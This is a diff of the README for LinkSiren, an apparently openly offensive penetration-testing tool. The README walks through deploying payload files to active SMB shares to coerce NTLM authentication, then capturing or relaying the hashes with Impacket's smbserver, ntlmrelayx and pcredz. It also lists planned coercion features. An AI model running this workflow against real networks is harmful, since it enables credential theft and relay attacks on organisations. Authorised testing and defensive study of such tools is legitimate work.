@@ -29,13 +29,15 @@ python -m pip install -r requirements.txt
 #    I recommend crackmapexec or shareenum 
 # 2. Use LinkSiren to identify the most active folders on them
 #    Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
+#    Note: Specify '.' as the domain to log in using a local user account
 python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets <shares file> --identify
 # 3. Use LinkSiren to deploy payloads to all of the active folders
 #    --identify saves UNC paths to active folders in folder_targets.txt
 python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --deploy
 # 4. Let the hashes come to you and relay them as you see fit :)
 #    Use CrackMapExec and LdapRelayScan for relay target identification
-#    Use Impacket's ntlmrelayx for relay or smbserver for capture on the attacker machine
+#    Use Impacket's ntlmrelayx for relay or smbserver + pcredz for capture on the attacker machine
+#    Ex. impacket-smbserver . . -smb2support
 # 5. Cleanup the payload files when you're finished gathering.
 #    Set targets to a file containing UNC paths of all folders where payloads were written
 #    --deploy saves UNC paths to deployed payloads in payload_folders.txt
@@ -57,9 +59,10 @@ I'm looking to add the following features:
 - [ ] Start the WebClient service on targets using searchConnector-ms and library-ms files (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#start-the-webclient-service) and [Farmer Source Code](https://github.com/mdsecactivebreach/Farmer/blob/main/crop/Crop/Crop.cs))
 - [ ] Coerce HTTP authentication with WebDAV connection strings (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse))
 - [ ] Support additional file types: SCF and LNK (per [MITRE]([url](https://attack.mitre.org/techniques/T1187/)))
-- [ ] Add a progress bar for share crawling
-- [ ] Enable ticket based authnentication (Kerberos)
 - [ ] Multithreading/Multiprocessing for faster share crawling
+- [ ] Add a progress bar for share crawling
+- [ ] Enable authentication using a NTLM hash
+- [ ] Enable ticket based authnentication (Kerberos)
 
 ## Note
 This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
